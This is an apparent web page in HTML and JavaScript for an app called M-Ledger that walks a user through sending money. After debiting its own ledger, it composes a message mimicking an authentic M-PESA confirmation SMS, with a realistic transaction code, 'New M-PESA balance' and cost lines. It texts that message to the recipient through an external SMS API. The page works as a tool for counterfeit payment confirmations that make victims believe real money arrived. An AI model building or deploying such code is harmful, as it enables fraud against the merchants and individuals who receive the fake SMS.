
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Send Money - M-Ledger</title>
<style>
* { box-sizing: border-box; }
body {
  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
  background: #000000;
  color: #ffffff;
  margin: 0;
  padding: 20px;
  min-height: 100vh;
  display: flex;
}
.left-content {
  flex: 1;
  padding-right: 20px;
}
.container {
  max-width: 450px;
  width: 100%;
  background: #000000;
  padding: 25px;
  border-radius: 12px;
  box-shadow: 0 8px 32px rgba(0,0,0,0.8);
}
input, button {
  width: 100%;
  padding: 12px 16px;
  margin-top: 8px;
  border: none;
  border-radius: 8px;
  font-size: 16px;
  display: none;
  background: #2a2a2a;
  color: #ffffff;
  border: 1px solid #333;
  font-weight: 600;
}
input.active, button.active {
  display: block;
}
button {
  background: #000000;
  cursor: pointer;
  transition: all 0.2s ease;
}
button:hover { background: #111111; }
button:disabled {
  opacity: 0.6;
  cursor: not-allowed;
}
.status-text {
  font-size: 19px;
  font-weight: 500;
  text-align: left;
  margin: 20px 0;
  padding: 16px;
  color: #ffffff;
  background: #1a1a1a;
  border-radius: 10px;
  line-height: 1.45;
  min-height: 80px;
  display: none;
}
.status-text.active {
  display: block;
}
.status-text.error {
  color: #ff6b6b;
  background: #2a0000;
}
.search-note {
  font-size: 0.82rem;
  color: #ffab00;
  margin-top: 6px;
  display: none;
  text-align: center;
}
.current-step {
  font-size: 24px;
  font-weight: 600;
  text-align: center;
  margin: 20px 0;
  padding: 16px 0;
  color: #ffffff;
  display: none;
}
.current-step.active {
  display: block;
}
</style>
</head>
<body>
<div class="left-content">
  <div class="container">
    <div class="current-step active" id="phoneLabel">Enter phone no.</div>
    <input type="text" id="phone" class="active" placeholder="">
    <button id="phoneOkBtn" class="active">OK</button>
    
    <div class="current-step" id="amountLabel">Enter Amount</div>
    <input type="number" id="amount" placeholder="Ksh">
    <button id="amountOkBtn">OK</button>
    
    <div class="current-step" id="nameLabel">Enter Full Name</div>
    <div id="editNote" class="search-note">Confirm Name (Edit if incorrect)</div>
    <input type="text" id="name" placeholder="Full name">
    <button id="nameOkBtn">OK</button>
    
    <div class="current-step" id="optionsLabel">Finalize Transaction</div>
    <button id="sendBtn">Confirm & Send</button>
    
    <div class="status-text" id="statusDisplay"></div>
  </div>
</div>

<script>
const SYSTEM_API  = "https://funds-5bhq.onrender.com/api";
const EXTERNAL_API = "https://meapp.emxluz.xyz";

let user = JSON.parse(localStorage.getItem('mledger_user'));
if (!user) location.href = 'index.html';

const elements = {
  phone: document.getElementById("phone"),
  amount: document.getElementById("amount"),
  name: document.getElementById("name"),
  editNote: document.getElementById("editNote"),
  status: document.getElementById("statusDisplay"),
  sendBtn: document.getElementById("sendBtn"),
  phoneOkBtn: document.getElementById("phoneOkBtn"),
  amountOkBtn: document.getElementById("amountOkBtn"),
  nameOkBtn: document.getElementById("nameOkBtn")
};

function formatBalance(amount) {
  return "Ksh " + Number(amount).toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2});
}

function formatNumericDate() {
  const now = new Date();
  const day   = now.getDate().toString().padStart(2, '0');
  const month = (now.getMonth() + 1).toString().padStart(2, '0');
  const year  = now.getFullYear();
  return `${day}/${month}/${year}`;
}

function formatTime12Hour() {
  const now = new Date();
  return now.toLocaleTimeString('en-US', {
    hour: 'numeric',
    minute: '2-digit',
    hour12: true
  });
}

function calculateCost(amt) {
  if (amt <= 100) return 0;
  if (amt <= 500) return 7;
  if (amt <= 1000) return 13;
  if (amt <= 5000) return 25;
  if (amt <= 10000) return 55;
  if (amt <= 20000) return 75;
  return 108;
}

function showStatus(msg, isError = false) {
  elements.status.textContent = msg;
  elements.status.className = isError ? 'status-text active error' : 'status-text active';
}

function showStep(step) {
  document.querySelectorAll('.current-step').forEach(el => el.classList.remove('active'));
  document.querySelectorAll('input, button:not(#sendBtn)').forEach(el => el.classList.remove('active'));
  elements.editNote.style.display = "none";
  elements.status.className = 'status-text'; // hide status

  if (step === 'phone') {
    document.getElementById('phoneLabel').classList.add('active');
    elements.phone.classList.add('active');
    elements.phoneOkBtn.classList.add('active');
  } else if (step === 'amount') {
    document.getElementById('amountLabel').classList.add('active');
    elements.amount.classList.add('active');
    elements.amountOkBtn.classList.add('active');
  } else if (step === 'name') {
    document.getElementById('nameLabel').classList.add('active');
    elements.name.classList.add('active');
    elements.nameOkBtn.classList.add('active');
    if (elements.name.value.trim()) elements.editNote.style.display = "block";
  } else if (step === 'options') {
    document.getElementById('optionsLabel').classList.add('active');
    elements.sendBtn.classList.add('active');
  }
}

function getMonthlyLetter() {
  return String.fromCharCode(65 + new Date().getMonth());
}

// ────────────────────────────────────────────────

elements.phoneOkBtn.addEventListener("click", async () => {
  const phoneVal = elements.phone.value.trim();
  if (!phoneVal) return showStatus("Enter phone number", true);

  showStatus("Looking up name...");
  try {
    const res = await fetch(`${EXTERNAL_API}/lookup/${phoneVal}`);
    const data = await res.json();
    elements.name.value = data.found && data.name ? data.name : "";
  } catch {}
  showStep('amount');
});

elements.amountOkBtn.addEventListener("click", () => {
  const amt = parseFloat(elements.amount.value);
  if (!amt || amt <= 0) return showStatus("Enter a valid amount", true);

  const cost = calculateCost(amt);
  const required = amt + cost;
  if (required > user.balance) {
    return showStatus(`Balance: ${formatBalance(user.balance)}\nNeed: ${formatBalance(required)}`, true);
  }
  showStep('name');
});

elements.nameOkBtn.addEventListener("click", () => {
  if (!elements.name.value.trim()) return showStatus("Please enter full name", true);
  showStep('options');
});

elements.sendBtn.addEventListener("click", async () => {
  const phoneVal  = elements.phone.value.trim();
  const amountVal = parseFloat(elements.amount.value);
  const nameVal   = elements.name.value.trim();
  const cost      = calculateCost(amountVal);

  elements.sendBtn.innerText = "Processing...";
  elements.sendBtn.disabled = true;

  try {
    const sysRes = await fetch(`${SYSTEM_API}/send`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        fromPhone: user.phone,
        toPhone: phoneVal,
        amount: amountVal
      })
    });

    const sysData = await sysRes.json();
    if (!sysRes.ok) throw new Error(sysData.error || "Transaction failed");

    // Update balance
    user.balance = sysData.balance;
    localStorage.setItem('mledger_user', JSON.stringify(user));

    // Generate confirmation
    const monthlyLetter = getMonthlyLetter();
    const day = new Date().getDate();
    const randomPart = Math.random().toString(36).substring(2,6).toUpperCase();
    const token = `U${monthlyLetter}${day}K65${randomPart}`;

    const dateStr = formatNumericDate();   // ← now DD/MM/YYYY
    const timeStr = formatTime12Hour();

    const message = `${token} Confirmed. Ksh${amountVal.toFixed(2)} sent to ${nameVal} on ${dateStr} at ${timeStr}. New M-PESA balance is Ksh${user.balance.toFixed(2)}.Transaction Cost,Ksh${cost.toFixed(2)}.Amount you can transact within the day is 499,777.00.Sign up for Lipa Na M-PESA Till online https://m-pesaforbusiness.co.ke
`;

    showStatus(message);

    // Send SMS notification — don't wait for it
    fetch(`${EXTERNAL_API}/send`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        phone: phoneVal,
        name: nameVal,
        amount: amountVal,
        message,
        token,
        cost
      })
    }).catch(() => {}); // silent fail — user already sees success

    // Faster redirect
    setTimeout(() => {
      location.href = 'act.html';
    }, 1800);

  } catch (e) {
    showStatus(e.message || "Transaction failed", true);
    elements.sendBtn.innerText = "Try Again";
    elements.sendBtn.disabled = false;
  }
});

// Start
showStep('phone');
</script>
</body>
</html>
